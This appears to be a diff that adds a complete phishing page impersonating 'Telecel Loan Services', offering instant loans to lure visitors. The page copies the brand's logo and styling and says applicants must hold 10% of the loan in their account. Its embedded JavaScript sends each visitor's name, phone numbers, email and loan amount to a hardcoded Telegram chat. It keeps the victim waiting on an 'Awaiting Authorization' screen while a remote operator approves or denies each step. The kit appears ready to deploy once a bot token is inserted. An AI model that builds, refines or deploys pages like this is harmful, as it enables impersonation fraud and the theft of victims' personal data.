@@ -1,0 +1,287 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Telecel Loan Services</title>
+  <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600;700;800&family=Open+Sans:wght@400;500;600&display=swap" rel="stylesheet"/>
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    :root { --red: #CC0000; --red-dark: #a30000; --white: #ffffff; --gray: #e0e0e0; --text: #1a1a1a; --muted: #666; }
+    body { font-family: 'Open Sans', sans-serif; background: #f0f0f0; min-height: 100vh; display: flex; flex-direction: column; align-items: center; }
+    header { width: 100%; background: var(--white); box-shadow: 0 2px 12px rgba(0,0,0,0.1); padding: 14px 30px; display: flex; align-items: center; gap: 14px; }
+    header img { height: 52px; }
+    header .brand { display: flex; flex-direction: column; }
+    header .brand span:first-child { font-family: 'Montserrat',sans-serif; font-weight: 800; font-size: 1.25rem; color: var(--red); }
+    header .brand span:last-child { font-size: 0.75rem; color: var(--muted); font-weight: 500; }
+    .hero { width: 100%; background: linear-gradient(135deg, var(--red) 0%, #8b0000 100%); color: white; text-align: center; padding: 38px 20px 30px; }
+    .hero h1 { font-family: 'Montserrat',sans-serif; font-size: 1.9rem; font-weight: 800; margin-bottom: 10px; }
+    .hero p { font-size: 0.97rem; opacity: 0.92; max-width: 520px; margin: 0 auto 20px; line-height: 1.6; }
+    .requirements { background: rgba(255,255,255,0.13); border: 1px solid rgba(255,255,255,0.25); border-radius: 10px; max-width: 520px; margin: 0 auto; padding: 16px 20px; text-align: left; }
+    .requirements h3 { font-family: 'Montserrat',sans-serif; font-size: 0.82rem; font-weight: 700; letter-spacing: 1px; text-transform: uppercase; margin-bottom: 10px; opacity: 0.85; }
+    .requirements ul { list-style: none; display: flex; flex-direction: column; gap: 8px; }
+    .requirements ul li { font-size: 0.87rem; display: flex; align-items: flex-start; gap: 9px; line-height: 1.5; }
+    .requirements ul li::before { content: '✓'; background: rgba(255,255,255,0.22); border-radius: 50%; width: 19px; height: 19px; display: flex; align-items: center; justify-content: center; font-size: 0.68rem; flex-shrink: 0; margin-top: 1px; }
+    .steps { display: flex; align-items: center; justify-content: center; margin: 28px auto 0; max-width: 320px; padding: 0 20px; }
+    .step { display: flex; flex-direction: column; align-items: center; gap: 5px; }
+    .step-circle { width: 36px; height: 36px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-family: 'Montserrat',sans-serif; font-weight: 700; font-size: 0.9rem; border: 2px solid var(--gray); background: var(--white); color: var(--muted); transition: all 0.3s; }
+    .step-circle.active { background: var(--red); border-color: var(--red); color: white; }
+    .step-circle.done { background: #28a745; border-color: #28a745; color: white; }
+    .step-label { font-size: 0.72rem; color: var(--muted); font-weight: 600; white-space: nowrap; }
+    .step-label.active { color: var(--red); }
+    .step-line { flex: 1; height: 2px; background: var(--gray); margin: 0 8px 20px; }
+    .step-line.done { background: #28a745; }
+    .card { background: var(--white); border-radius: 14px; box-shadow: 0 4px 24px rgba(0,0,0,0.09); width: 100%; max-width: 520px; margin: 28px auto 40px; padding: 34px 32px; }
+    .card h2 { font-family: 'Montserrat',sans-serif; font-size: 1.15rem; font-weight: 700; color: var(--text); margin-bottom: 5px; }
+    .card .subtitle { font-size: 0.82rem; color: var(--muted); margin-bottom: 26px; }
+    .form-group { margin-bottom: 20px; }
+    .form-group label { display: block; font-size: 0.82rem; font-weight: 600; color: var(--text); margin-bottom: 7px; }
+    .form-group input { width: 100%; padding: 13px 15px; border: 1.5px solid var(--gray); border-radius: 8px; font-family: 'Open Sans',sans-serif; font-size: 0.93rem; color: var(--text); background: #fafafa; outline: none; transition: border-color 0.2s, box-shadow 0.2s; }
+    .form-group input:focus { border-color: var(--red); box-shadow: 0 0 0 3px rgba(204,0,0,0.08); background: white; }
+    .btn-row { display: flex; gap: 12px; margin-top: 28px; }
+    .btn { flex: 1; padding: 14px; border: none; border-radius: 8px; font-family: 'Montserrat',sans-serif; font-weight: 700; font-size: 0.92rem; cursor: pointer; transition: all 0.2s; }
+    .btn-proceed { background: var(--red); color: white; box-shadow: 0 4px 14px rgba(204,0,0,0.3); width: 100%; }
+    .btn-proceed:hover { background: var(--red-dark); box-shadow: 0 6px 18px rgba(204,0,0,0.4); transform: translateY(-1px); }
+    .btn-proceed:active { transform: translateY(0); }
+    .btn-proceed:disabled { background: #aaa; box-shadow: none; cursor: not-allowed; transform: none; }
+    .page { display: none; }
+    .page.active { display: block; }
+    footer { text-align: center; font-size: 0.75rem; color: #aaa; padding: 18px; }
+    .overlay { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.55); z-index: 999; align-items: center; justify-content: center; }
+    .overlay.show { display: flex; }
+    .spinner-box { background: white; border-radius: 16px; padding: 34px 40px; text-align: center; box-shadow: 0 8px 32px rgba(0,0,0,0.2); max-width: 300px; width: 90%; }
+    .spinner { width: 44px; height: 44px; border: 4px solid #eee; border-top-color: var(--red); border-radius: 50%; animation: spin 0.7s linear infinite; margin: 0 auto 16px; }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    .spinner-box h3 { font-family: 'Montserrat',sans-serif; font-weight: 700; font-size: 1rem; color: var(--text); margin-bottom: 6px; }
+    .spinner-box p { font-size: 0.82rem; color: var(--muted); line-height: 1.5; }
+    .status-badge { display: inline-flex; align-items: center; gap: 6px; font-size: 0.78rem; font-weight: 600; padding: 5px 12px; border-radius: 20px; margin-top: 12px; }
+    .status-waiting { background: #fff3cd; color: #856404; }
+    .status-denied { background: #f8d7da; color: #721c24; }
+    .error-msg { background: #f8d7da; border: 1px solid #f5c6cb; border-radius: 8px; padding: 12px 16px; margin-top: 16px; font-size: 0.85rem; color: #721c24; font-weight: 600; text-align: center; display: none; }
+    @media (max-width: 560px) { .card { margin: 20px 14px 30px; padding: 24px 18px; } .hero h1 { font-size: 1.4rem; } }
+  </style>
+</head>
+<body>
+
+  <header>
+    <img src="data:image/png;base64,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" alt="Telecel"/>
+    <div class="brand">
+      <span>Telecel</span>
+      <span>Loan Services Portal</span>
+    </div>
+  </header>
+
+  <div class="hero">
+    <h1>Quick &amp; Easy Telecel Loans</h1>
+    <p>Access instant loans through your Telecel account. Fast approval, flexible repayment, and competitive rates — available 24/7.</p>
+    <div class="requirements">
+      <h3>Requirements</h3>
+      <ul>
+        <li>Active Telecel mobile number</li>
+        <li>At least <strong>10% of the requested loan amount</strong> must be available in your Telecel account</li>
+        <li>Valid personal identification and contact details</li>
+        <li>Consistent Telecel usage history</li>
+      </ul>
+    </div>
+  </div>
+
+  <div class="steps">
+    <div class="step">
+      <div class="step-circle active" id="step1-circle">1</div>
+      <div class="step-label active" id="step1-label">Personal Info</div>
+    </div>
+    <div class="step-line" id="step-line"></div>
+    <div class="step">
+      <div class="step-circle" id="step2-circle">2</div>
+      <div class="step-label" id="step2-label">Loan Details</div>
+    </div>
+  </div>
+
+  <!-- PAGE 1 -->
+  <div class="card page active" id="page1">
+    <h2>Personal Information</h2>
+    <p class="subtitle">Provide your details to begin your loan application</p>
+    <div class="form-group">
+      <label>Full Name</label>
+      <input type="text" id="fullname" autocomplete="off"/>
+    </div>
+    <div class="form-group">
+      <label>Phone Number</label>
+      <input type="tel" id="phone1" autocomplete="off"/>
+    </div>
+    <div id="error1" class="error-msg">❌ Application declined. Please check your details and try again.</div>
+    <div class="btn-row">
+      <button class="btn btn-proceed" id="btn1" onclick="submitPage1()">Proceed &rarr;</button>
+    </div>
+  </div>
+
+  <!-- PAGE 2 -->
+  <div class="card page" id="page2">
+    <h2>Loan Application Details</h2>
+    <p class="subtitle">Fill in your contact and loan information</p>
+    <div class="form-group">
+      <label>Working Phone Number</label>
+      <input type="tel" id="working_phone" autocomplete="off"/>
+    </div>
+    <div class="form-group">
+      <label>Email Address</label>
+      <input type="email" id="email" autocomplete="off"/>
+    </div>
+    <div class="form-group">
+      <label>Confirm Phone Number</label>
+      <input type="tel" id="phone2" autocomplete="off"/>
+    </div>
+    <div class="form-group">
+      <label>Loan Amount (USD)</label>
+      <input type="number" id="loan_amount" autocomplete="off" min="1"/>
+    </div>
+    <div id="error2" class="error-msg">❌ Application declined. Please check your details and try again.</div>
+    <div class="btn-row">
+      <button class="btn btn-proceed" id="btn2" onclick="submitPage2()">Submit Application &rarr;</button>
+    </div>
+  </div>
+
+  <!-- WAITING OVERLAY -->
+  <div class="overlay" id="overlay">
+    <div class="spinner-box">
+      <div class="spinner"></div>
+      <h3>Awaiting Authorization</h3>
+      <p>Your details have been sent for verification. Please wait...</p>
+      <div class="status-badge status-waiting">⏳ Pending approval</div>
+    </div>
+  </div>
+
+  <footer>&copy; 2025 Telecel Loan Services. All rights reserved.</footer>
+
+  <script>
+    // ✏️ REPLACE with your actual Bot Token before going live
+    const BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE';
+    const CHAT_ID = '8718124300';
+
+    let pollingInterval = null;
+    let lastUpdateId = 0;
+
+    function showOverlay() { document.getElementById('overlay').classList.add('show'); }
+    function hideOverlay() { document.getElementById('overlay').classList.remove('show'); }
+
+    async function sendToTelegram(message, callbackKey) {
+      const url = 'https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage';
+      const payload = {
+        chat_id: CHAT_ID,
+        text: message,
+        parse_mode: 'HTML',
+        reply_markup: {
+          inline_keyboard: [[
+            { text: '✅ Authorize', callback_data: 'auth_' + callbackKey },
+            { text: '❌ Wrong Details', callback_data: 'deny_' + callbackKey }
+          ]]
+        }
+      };
+      const res = await fetch(url, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+      });
+      const data = await res.json();
+      return data.ok ? data.result.message_id : null;
+    }
+
+    async function answerCallback(callbackQueryId, text) {
+      await fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/answerCallbackQuery', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ callback_query_id: callbackQueryId, text: text })
+      });
+    }
+
+    function pollForResponse(callbackKey) {
+      return new Promise((resolve) => {
+        pollingInterval = setInterval(async () => {
+          try {
+            const url = 'https://api.telegram.org/bot' + BOT_TOKEN + '/getUpdates?offset=' + (lastUpdateId + 1) + '&timeout=2';
+            const res = await fetch(url);
+            const data = await res.json();
+            if (!data.ok || !data.result.length) return;
+
+            for (const update of data.result) {
+              lastUpdateId = update.update_id;
+              if (update.callback_query) {
+                const cb = update.callback_query;
+                if (cb.data === 'auth_' + callbackKey || cb.data === 'deny_' + callbackKey) {
+                  clearInterval(pollingInterval);
+                  const authorized = cb.data.startsWith('auth_');
+                  await answerCallback(cb.id, authorized ? '✅ Authorized!' : '❌ Denied');
+                  resolve(authorized);
+                  return;
+                }
+              }
+            }
+          } catch(e) { /* keep polling */ }
+        }, 2000);
+      });
+    }
+
+    async function submitPage1() {
+      const name = document.getElementById('fullname').value.trim();
+      const phone = document.getElementById('phone1').value.trim();
+      const btn = document.getElementById('btn1');
+      const error = document.getElementById('error1');
+      error.style.display = 'none';
+      btn.disabled = true;
+
+      const key = 'p1_' + Date.now();
+      const msg = '🔐 <b>AUTHORIZATION REQUEST — Page 1</b>\n\n👤 Full Name: ' + (name||'(empty)') + '\n📞 Phone: ' + (phone||'(empty)') + '\n\nTap a button below to authorize or deny:';
+
+      showOverlay();
+      await sendToTelegram(msg, key);
+      const authorized = await pollForResponse(key);
+      hideOverlay();
+      btn.disabled = false;
+
+      if (authorized) {
+        document.getElementById('page1').classList.remove('active');
+        document.getElementById('page2').classList.add('active');
+        document.getElementById('step1-circle').classList.remove('active');
+        document.getElementById('step1-circle').classList.add('done');
+        document.getElementById('step1-circle').textContent = '✓';
+        document.getElementById('step1-label').classList.remove('active');
+        document.getElementById('step-line').classList.add('done');
+        document.getElementById('step2-circle').classList.add('active');
+        document.getElementById('step2-label').classList.add('active');
+        window.scrollTo({ top: 0, behavior: 'smooth' });
+      } else {
+        error.style.display = 'block';
+      }
+    }
+
+    async function submitPage2() {
+      const wp = document.getElementById('working_phone').value.trim();
+      const em = document.getElementById('email').value.trim();
+      const p2 = document.getElementById('phone2').value.trim();
+      const amt = document.getElementById('loan_amount').value.trim();
+      const btn = document.getElementById('btn2');
+      const error = document.getElementById('error2');
+      error.style.display = 'none';
+      btn.disabled = true;
+
+      const key = 'p2_' + Date.now();
+      const msg = '🔐 <b>AUTHORIZATION REQUEST — Page 2</b>\n\n📞 Working Phone: ' + (wp||'(empty)') + '\n📧 Email: ' + (em||'(empty)') + '\n📞 Confirm Phone: ' + (p2||'(empty)') + '\n💰 Loan Amount: $' + (amt||'(empty)') + '\n\nTap a button below to authorize or deny:';
+
+      showOverlay();
+      await sendToTelegram(msg, key);
+      const authorized = await pollForResponse(key);
+      hideOverlay();
+      btn.disabled = false;
+
+      if (authorized) {
+        document.getElementById('page2').innerHTML = '<div style="text-align:center;padding:20px 0;"><div style="font-size:3rem;margin-bottom:14px;">✅</div><h2 style="font-family:Montserrat,sans-serif;color:#28a745;margin-bottom:10px;">Application Submitted!</h2><p style="color:#666;font-size:0.9rem;line-height:1.6;">Your loan application has been received and authorized. Our team will contact you shortly via your provided phone number.</p></div>';
+        document.getElementById('step2-circle').classList.remove('active');
+        document.getElementById('step2-circle').classList.add('done');
+        document.getElementById('step2-circle').textContent = '✓';
+      } else {
+        error.style.display = 'block';
+      }
+    }
+  </script>
+</body>
+</html>
